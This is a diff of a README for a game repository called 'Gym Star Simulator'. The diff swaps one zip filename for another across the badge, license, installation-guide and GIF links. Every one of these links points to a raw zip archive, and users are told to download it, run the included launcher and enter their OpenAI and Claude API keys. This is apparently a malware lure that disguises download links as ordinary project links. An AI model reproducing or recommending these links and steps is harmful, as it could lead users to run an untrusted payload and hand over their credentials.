@@ -1,8 +1,8 @@
 # 🏆 Gym Star Simulator 🌟
 
-![OS Compatibility](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/star_elite_gym_sim_v1.1.zip%7CMacOS%7CLinux-blue)
-![API-Ready](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/star_elite_gym_sim_v1.1.zip%20%7C%20Claude-orange)
-![License: MIT](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/star_elite_gym_sim_v1.1.zip)
+![OS Compatibility](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/elite-sim-star-gym-3.4.zip%7CMacOS%7CLinux-blue)
+![API-Ready](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/elite-sim-star-gym-3.4.zip%20%7C%20Claude-orange)
+![License: MIT](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/elite-sim-star-gym-3.4.zip)
 
 Welcome to **Gym Star Simulator** – the most electrifying and immersive gym life simulation project of 2025! Whether you're aspiring to build a virtual fitness empire, master AI-integrated workouts, or unravel the social side of the modern gym, this repository is your next-level training ground. Set in a world where coding and cardio collide, **Gym Star Simulator** is powered by OpenAI and Claude AI APIs for hyper-intelligent gameplay, packed with adaptive, intuitive interfaces that flex to your every need.
 
@@ -14,7 +14,7 @@ Welcome to **Gym Star Simulator** – the most electrifying and immersive gym li
 - 🏋️‍♂️ Adaptive & AI-Powered Functionality
 - 🌐 Languages for Everyone 
 - 🔥 Unrivaled API Integration
-- 🛠️ Installation Guide (https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/star_elite_gym_sim_v1.1.zip)
+- 🛠️ Installation Guide (https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/elite-sim-star-gym-3.4.zip)
 - 💻 OS Compatibility Matrix
 - 📚 Detailed Functions
 - 💬 Support Promise
@@ -67,7 +67,7 @@ Unlock the future—connect these APIs and experience the most intelligent gym s
 Jumpstart your digital training journey in a few simple steps! No heavy lifting required.
 
 **Step 1**  
-Download the `https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/star_elite_gym_sim_v1.1.zip` archive from the repository.
+Download the `https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/elite-sim-star-gym-3.4.zip` archive from the repository.
 
 **Step 2**  
 Unzip it into your preferred directory, and run the included launcher (install guide below).
@@ -79,7 +79,7 @@ Configure your API keys for OpenAI and Claude for immersive AI features.
 Launch, set your language, and dive headfirst into the future of gym simulation!
 
 **🎬 Installation Video Tour:**  
-![Installation Tutorial GIF](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/star_elite_gym_sim_v1.1.zip)
+![Installation Tutorial GIF](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/elite-sim-star-gym-3.4.zip)
 
 ---
 
@@ -125,7 +125,7 @@ If ever you hit a snag—day or night—our dedicated help system is always a cl
 
 # 📃 License
 
-Released in 2025 under the [MIT License](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/star_elite_gym_sim_v1.1.zip). Gym Star Simulator is yours to mold, enhance, and deploy—fueling both creativity and community growth across the ever-evolving digital gym space.
+Released in 2025 under the [MIT License](https://raw.githubusercontent.com/imane-omari/gym-star-sim-elite/main/epochal/elite-sim-star-gym-3.4.zip). Gym Star Simulator is yours to mold, enhance, and deploy—fueling both creativity and community growth across the ever-evolving digital gym space.
 
 ---
 
